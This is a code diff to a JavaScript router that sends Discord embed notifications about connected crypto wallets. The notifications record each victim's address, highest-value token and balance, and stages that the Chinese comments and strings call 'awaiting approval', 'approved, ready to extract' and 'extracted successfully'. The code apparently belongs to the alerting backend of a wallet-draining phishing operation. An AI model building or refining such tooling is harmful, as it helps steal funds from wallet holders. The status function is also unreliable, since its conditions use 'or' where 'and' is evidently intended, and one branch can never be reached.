@@ -18,23 +18,48 @@ class JsonResponse extends Response {
 const customRouter = AutoRouter({ base: '/custom' });
 
 /**
+ * 根据状态返回对应的文本
+ * @param {string} data - 状态字符串
+ * @returns {string} 对应的文本
+ */
+function getStatusText(data) {
+  if(data.contract_status === 'found' && data.approval_status === 'none' && data.transfer_status === 'none'){
+    return `用户已经连接钱包，等待授权`;
+  }else if(data.contract_status === 'found' || data.approval_status === 'approved' || data.transfer_status === 'none'){
+    return `用户已经授权，准备提取`;
+  }else if(data.contract_status === 'found' || data.approval_status === 'approved' || data.transfer_status === 'transferred'){
+    return `系统已经提取成功`;
+  }
+  return `未知状态`;
+}
+
+/**
  * 发送消息到 Discord 频道
  * @param {string} channelId - Discord 频道 ID
  * @param {string} content - 消息内容
  * @param {string} token - Discord Bot Token
  * @param {Array} components - 可选的组件数组（按钮等）
+ * @param {Array} embeds - 可选的嵌入消息数组
  * @returns {Promise<Object>} Discord API 响应
  */
-async function sendDiscordMessage(channelId, content, token, components = null) {
+async function sendDiscordMessage(channelId, content, token, components = null, embeds = null) {
   const url = `https://discord.com/api/v10/channels/${channelId}/messages`;
   
-  const messageData = {
-    content: content,
-  };
+  const messageData = {};
+
+  // 如果有内容，添加到消息数据中
+  if (content) {
+    messageData.content = content;
+  }
 
   // 如果有组件，添加到消息数据中
   if (components && components.length > 0) {
     messageData.components = components;
+  }
+
+  // 如果有嵌入消息，添加到消息数据中
+  if (embeds && embeds.length > 0) {
+    messageData.embeds = embeds;
   }
   
   const response = await fetch(url, {
@@ -404,28 +429,48 @@ customRouter.post('/send-message-by-type', async (request, env) => {
 
         const data = body.notificationData;
         
-        // 创建格式化的通知内容
-        const notificationContent = `连接通知 #${data.id}
+      
+        let color = 0x3498db; // 默认蓝色
 
-用户地址: ${data.userAddress}
-
-代币信息:
-符号: ${data.tokenSymbol}
-余额: ${data.formattedBalance} ${data.tokenSymbol}
-价值: $${data.tokenValue.toFixed(2)}
-
-状态信息:
-合约状态: ${data.contract_status}
-授权状态: ${data.approval_status}
-转账状态: ${data.transfer_status}
-
-创建时间: ${data.createdAt}
-更新时间: ${data.updatedAt}`;
+        // 创建 Discord Embed
+        const notificationEmbed = {
+          title: `🔔 新通知 #`,
+          description: `用户地址: \`${data.userAddress}\``,
+          color: color,
+          fields: [
+            {
+              name: '记录ID',
+              value: `${data.id}`,
+              inline: true
+            },
+            {
+              name: '💰 最高价值的代币信息',
+              value: `**符号:** ${data.tokenSymbol}\n**余额:** ${data.formattedBalance} ${data.tokenSymbol}\n**价值:** $${data.tokenValue.toFixed(2)}`,
+              inline: true
+            },
+            {
+              name: '📊 状态信息',
+              value: ` ${getStatusText(data)}`,
+              inline: true
+            },
+            {
+              name: '⏰ 时间信息',
+              value: `**创建时间:** ${data.createdAt}\n**更新时间:** ${data.updatedAt}`,
+              inline: false
+            }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: {
+            text: '区块链通知系统'
+          }
+        };
 
         result = await sendDiscordMessage(
           body.channelId,
-          notificationContent,
-          env.DISCORD_TOKEN
+          null, // 不需要文本内容，使用embed
+          env.DISCORD_TOKEN,
+          null, // 暂不添加按钮
+          [notificationEmbed]
         );
         messageInfo = { 
           type: 'notification', 
